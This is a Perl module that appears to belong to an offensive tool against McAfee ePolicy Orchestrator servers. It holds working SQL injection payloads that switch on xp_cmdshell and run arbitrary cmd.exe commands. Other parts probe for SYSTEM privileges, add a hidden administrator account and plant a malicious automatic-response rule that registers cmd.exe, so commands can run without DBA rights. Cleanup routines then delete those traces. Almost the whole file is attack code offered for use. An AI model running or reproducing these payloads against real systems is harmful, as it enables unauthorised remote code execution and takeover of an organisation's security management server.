package Epowner::Epo;

use URI::Escape;
use Term::ANSIColor;

use strict;
use warnings;



sub mode_server_exec_notdba_setup_get_sql_statement{
	my $this = shift;
	my $cmdName = shift;	# the name of the Registered EXE in DB

	my $guid    = $this->{agent_guid};
	$guid	    =~ s/{|}//g;

	
	# Virus detected event
	my $eventid = 2412;

        my $sqli =
	"" .
        "') ; " .
        "INSERT INTO [dbo].[EPOAlertRegisteredExe] (Name, Path) VALUES ('$cmdName', 'C:\\WINDOWS\\system32\\cmd.exe') ; " .
        "INSERT INTO [dbo].[OrionResponseRule] (AggregationURI,AggregationWindowURI,ConditionURI, CreatedBy, CreatedOn,ModifiedBy,ModifiedOn,Description, Enabled, EventType,GroupingURI,ThrottlingURI, Name, ActionsURIs, Locale) VALUES (" .
                "''," .                                 # AggregationURI
                "''," .                                 # AggregationWindowURI
		"'rule:condition?conditionSexp=%28+where+%28+and+%28+eq+epoClientStatusEvent.agentGUID+%22$guid%22+%29+%28+eq+epoClientStatusEvent.tVDEventID+$eventid++%29+%29+%29&requiredFilter=%28+where+%28+descendsFrom+epoClientStatusEvent.definedAt+%222%22+%29+%29'," .  # ConditionURI
		"'admin' ," .                           # CreatedBy
                "'2012-12-09 00:40:50.963' ," .         # CreatedOn
		"'system'," .
		"'2012-12-10 16:35:47.447'," .
		"''," .					# Description
                "1," .                                  # Enabled
                "'epoClientStatusEvent' ," .	        # EventType
		"''," .					# GroupingURI
		"''," . 				# ThrottlingURI
                "'$cmdName' ," .                        # Name
                "'command:alert.response.externalCmd?timeLimit=60000&cmdName=$cmdName&cmdArgs=%2Fc+{hostName}' ," .   	# ActionsURIs, the arg is '/c {hostName}' 
															# {hostName} value will be received later from an Event sent by the agent
                "'en'); " .                             # Locale
        	" -- " .
	"";


	return $sqli
}


sub mode_server_exec_wizard {
	my $this = shift;

	# Test if we have remote code exec on the ePo server and which mode to use.


	my $sec = 15;
	my $check_for_nondba = 0;
	my $add_admin = 0;

        # TEST XP_CMDSHELL (PING )
        # Goal: check if we are DBA

        print "\n";

	$this->print_info   ("[*] Testing for XP_CMDSHELL availability\n");
	$this->print_info_l2("    (xp_cmdshell 'ping -n $sec 127.0.0.1')\n");
      #  print colored("[*] Testing for xp_cmdshell availability using \"xp_cmdshell 'ping -n $sec 127.0.0.1'\"\n", 'cyan');

        my $sqli_ping = "')  " .
                "EXEC sp_configure 'show advanced options',1 ; RECONFIGURE ; " .
                "EXEC sp_configure 'xp_cmdshell',1 ; RECONFIGURE ; " .
                "EXEC master.dbo.xp_cmdshell 'ping -n $sec 127.0.0.1'; --" ;

        my $http_request = $this->mode_common_generate_fullprops_request($sqli_ping);

        my $time_start = time();
        $this->send_http_request($http_request);
        my $time_stop = time();

        my $delay = $time_stop - $time_start;
        if($delay < ($sec - 2)){
                my $str = sprintf "[-] Not good... Elapsed time: %.3f seconds (expected +/- $sec)\n", $delay;
		$this->print_warn($str);
		$this->print_warn("    xp_cmdshell doesn't seems available with the current SQL privileges... \n");

                $this->{server_is_dba} = 0;
                $check_for_nondba = 1;

        }else{

		# XP_CMSHELL is available !

                my $str = sprintf "[+] Looks good !! Elapsed time: %.3f seconds\n", $delay;
		print $str;

                # WE ARE DBA !
                $this->print_ok("[+] It appears that xp_cmdshell is available with the current SQL privs\n");
                $this->{server_is_dba} = 1;

        	# TESTING XP_CMDSHELL 'WHOAMI' 
	        # Goal: - Do we have SYSTEM or Network Service priv ?

                print "\n";
		$this->print_info("[*] Getting current SQL 'runas' account using \"xp_cmdshell 'whoami'\"\n");
		
		if($this->mode_readdb_get_mssql_whoami()){
			print "[+] Whoami returned: '" ; $this->print_info_l2($this->{server_mssql_whoami});  print "'\n";
		}else{
			$this->print_warn("[-] Whoami didn't succeed\n");
		}

		print "\n";
		$this->print_info("[*] Testing our privileges using 'reg query \"HKU\\S-1-5-19\"'\n");
		if($this->mode_readdb_get_mssql_runas_priv()){
			$this->print_ok("[+] OK, We have HIGH privileges by using xp_cmdshell ! :)\n");
                        $this->{srv_exec_mode} = 1; # Use DBA mode as default
                        $this->{srv_exec_priv} = 1;

		}else{
	
			$this->print_warn("[-] WARN: We have LIMITED privileges using xp_cmdshell\n");
                        $this->print_warn("    Multiple actions/modes in this tool require high privileges .. \n"); 
                        $check_for_nondba = 1;
			$this->{srv_exec_mode} = 1; # Use DBA mode as default. Can be overwritten later
			$this->{srv_exec_priv} = 0;
		}

        }


        if($check_for_nondba ) {

                # We do not have DBA priv, or it is without SYSTEM priv.
                # Last chance for RCE is to use non-DBA mode (automatic response rule). Requirment: Web console access

		print "\n";
		$this->print_info("[*] Trying to setup Remote Code Exec using another method (without xp_cmdshell)\n");		

		if ($this->{state_exec_nondba_setup}){

			$this->print_warn("[-] WARN: According to the config file, this mode is already configured\n");
			$this->print_warn("          If needed, use '--srv-exec --clean-nondba' to reset it and then restart the wizard\n");
			return 0;
		}

		# Check if the Web console port is reachable
		#============================================
		my $loop=1;
		my $webconsole_available = 0;
		while($loop){

			print "[+] Please provide the web console TCP port. Press enter for default port (8443) : ";
			my $webconsole_port = <>; chomp($webconsole_port);
			if($webconsole_port ne ''){
				$this->{server_consoleport} = $webconsole_port;
			}else{
				$this->{server_consoleport} = 8443;
			}

			# Test SSL connectivity
			if ($this->check_connectivity_webconsole()){
				# OK
				print "[+] Good. Web admin console is available\n";
				$webconsole_available = 1;
				$loop = 0;
			}else{
				print "[-] Connection failure. Try again using a different port ? [Y/n] : ";
				my $resp = <>; chomp($resp);
				if($resp eq 'n' or $resp eq 'N'){
					$this->print_err ("[-] Sorry. Web console connectivity is required to perform Remote Command Execution without xp_cmdshell.\n");
					$loop = 0;
				}
				
			}
		}

		


		# OK, we have the right TCP port
		
		if($webconsole_available){
	
			my $web_admin_added=0;

			print "\n";
			$this->print_info( "[*] Adding a new (invisible) admin web account using SQLi\n");

			if($this->{state_add_admin}){
        	        	$this->print_warn("[-] WARN: According to the config file, you already created an web admin account\n");
                	        $this->print_warn("    We will keep that account\n");
				$web_admin_added=1;		
			}else{
        	        	# Add web admin
	                        if($this->mode_addadmin()){
					$web_admin_added=1;
				}else{
					$this->print_err("[-] ERROR: error while adding the admin account\n");
				}
			}

			# OK. Last step, setup the response rule
                        if( $web_admin_added){ 
				print "\n";
				$this->print_info( "[*] Setting up NonDBA mode\n");
				if($this->mode_server_exec_notdba_setup()){
					$this->{srv_exec_mode} = 2; # Use NonDBA mode as default
					$this->{srv_exec_priv} = 1;
				}else{
					$this->print_err("[-] ERROR: error while setting up NonDBA RCE mode\n");
				}
                        }
                }
	}


#	# Do we have xp_cmdshell but with limited priv ? (example: 'nt authority\network service')
#	if($this->{srv_exec_mode} == 0 and $this->{server_is_dba}){
#		# Set srv_exec_mode to 1.
#		$this->{srv_exec_mode} = 1;
#		$this->{srv_exec_priv} = 0;
#	}


	print "\n";
	$this->print_info("[*] Final verdict:\n");
	if($this->{srv_exec_mode} == 1 && $this->{srv_exec_priv} == 1){
		$this->print_ok("[*] You have remote code execution with HIGH privileges using xp_cmdshell (DBA mode) ! Congrats!\n");
	}
	elsif($this->{srv_exec_mode} == 1 && $this->{srv_exec_priv} == 0){
                $this->print_warn("[*] You have remote code execution with LIMITED privileges using xp_cmdshell.\n");
		$this->print_warn("    All actions/modes will not be available to you :(\n");
        }
	elsif($this->{srv_exec_mode} == 2){
		$this->print_ok("[*] You have remote code execution with HIGH privileges using NonDBA mode ! Congrats!\n");
		print           "    NonDBA mode is asynchronous. Execution could take up to 1 minute to complete\n";
	}else{
		$this->print_err("[-] Huh.. Bug ? You should not reach me :-/\n");
	}



}

sub mode_server_exec_notdba_clean{

        my $this = shift;

        my $cmdName = $this->{common_prefix};

	my $sqli =
	"') ; " .
	"delete from [dbo].[EPOAlertRegisteredExe] where Name like '$cmdName%'; " .
	"delete from [dbo].[OrionResponseRule] where Name like '$cmdName%'; " .
	" -- ";

        # generate and send HTTP request
        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
        if($this->send_http_request($http_request)){
        }else{
                return 0;
        }

	# keep trace of this action
	$this->{state_exec_nondba_setup} = 0 ;

	return 1;
}
        
#====================================================================
# FUNCTION : Remote Command Execution : setup 
#====================================================================

sub mode_server_exec_notdba_setup{

	my $this = shift;

	# Test connectivity with web admin console
        if(not $this->check_connectivity_webconsole()){
                $this->print_err ("[-] ERROR: Could not connect to " . $this->{server_host}. ":" . $this->{server_consoleport} . "\n");
                $this->print_err ("           You can use '--server-console-port <port>' to use an alternate port. \n");

                return 0;
        }


	# We need an ePo admin first
	if($this->{state_add_admin} eq 0){
		$this->print_err ("[-] ERROR: You must create an ePo admin first!\n");
		$this->print_err ("    Please use '--add-admin' and try again..\n");
		return 0;
	}

        # generate a temp cmdname 
        my @c=('0'..'9', 'a'..'f');
        my $cmdName = $this->{common_prefix} . "-" . $c[rand @c].$c[rand @c].$c[rand @c].$c[rand @c];
	
	# Add a new Response Rules + RegisteredEXE into the DB
	#=====================================================

	print "[*] Adding a new 'Registered EXE' + 'Automatic Response' into the database\n";	

	# get SQL statement (add a response event in the DB which will check for the new mac)
	my $sqli = $this->mode_server_exec_notdba_setup_get_sql_statement($cmdName);

	# generate HTTP request
        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
	if($this->send_http_request($http_request)){
        }else{
                return 0;
        }


	print "[*] Login into to Web console\n";
	if(! $this->tomcat_login($this->{admin_username}, $this->{admin_password})) {
		$this->print_err("[-] Authentication failure\n");
		print "    Did you created a new admin account using --add-admin ?\n";
		return 0;
	}


	print "[*] ... and force a reload of DB\n";
	if(! $this->tomcat_update_response_rule($cmdName)){
		$this->print_err("[-] Reload failure\n");
		print "    'Setup' can only be used once! In case of trouble, use '--srv-exec --clean-nondba' and restart '--srv-exec --wizard'.\n";
		return 0;
	}


	# keep trace of this action
	$this->{state_exec_nondba_setup} = 1 ;

	return 1;
}



# If we don't have DBA priv, use "automatic responses" epo feature to
# excecute commands 
sub mode_server_exec_notdba {

        my $this = shift;
        my $cmd = shift;


	if($this->{state_exec_nondba_setup} eq 0){
print "TODO\n";
		$this->print_err ("[-] ERROR: You don't have DBA privileges. Please run '--srv-exec --setup-nondba' first.\n");
		exit;
	}

        # generate an Event  HTTP request
        my $http_request = $this->mode_common_generate_event_request($cmd);

	# Trigger the rule
        if($this->send_http_request($http_request)){
		print "    Your command should be processed within a few moment (up to 1 minute)\n";
        }else{
                return 0;;
        }

        return 1;

}


# If we have DBA priv, use "xp_cmdshell" to excecute commands 
sub mode_server_exec_isdba {
        
        my $this = shift;
        my $cmd = shift;

	# in DBA mode, we use 
	#	xp_cmdshell 'cmd.exe /c <cmd>'
	# therefore, single quotes are forbidden in <cmd>
	if($cmd =~ /'/){
		$this->print_err ("[-] ERROR: In dba mode, we use the following trick to get command execution:\n");
		$this->print_err ("           xp_cmdshell 'cmd.exe /c <cmd>'\n");
		$this->print_err ("           Therefore, single quotes are forbidden in <cmd> ... (we also got issues while using \\')\n");
		$this->print_err ("           If you can't avoid using single quote in your command, use non-dba exec mode using '--force-non-dba'\n");
		return 0;
	}

       
        my $sqli = "') " .
                "EXEC sp_configure 'show advanced options',1 ; RECONFIGURE ; " .
                "EXEC sp_configure 'xp_cmdshell',1 ; RECONFIGURE ; " .
                "EXEC master.dbo.xp_cmdshell 'cmd.exe /c $cmd'; --" ;

        my $http_request = $this->mode_common_generate_fullprops_request($sqli);

 
        # Send request
        if($this->send_http_request($http_request)){
                #$this->print_ok ("[*] Your command should have been processed\n");
        }else{
                return 0;;
        }

        return 1;

}


sub mode_server_exec_send {

	my $this = shift;
	my $cmd = shift;

	my $dba_mode;
	my $dba_mode_str;

	if($this->{srv_exec_mode} == 0){
                $this->print_err("[-] ERR: mode_server_exec_send(), srv_exec_mode not defined. Did you run '--srv-exec --wizard' ?\n");
                exit;
	}

	if($this->{srv_exec_mode} == 2 or $this->{server_force_nondba}){
                $dba_mode = 0;
                $dba_mode_str = "in Non-DBA mode (Asynchronous)";

	}elsif($this->{srv_exec_mode} == 1){
                # use DBA mode
                $dba_mode = 1;
                $dba_mode_str = "in DBA mode (Synchronous)";	
	}else{
		$this->print_err("[-] ERR: mode_server_exec_send(), srv_exec_mode invalid value\n");
		exit;
	}

	$this->print_info_l1("[*] Call to ModeServerExec ");
	print "$dba_mode_str\n";
	$this->print_info_l2("    Parameters: "); 
	print "$cmd\n";

	if($dba_mode eq 1 ){
		$this->mode_server_exec_isdba($cmd);
	}else{
		$this->mode_server_exec_notdba($cmd);
	}
	return 1;
}

1;
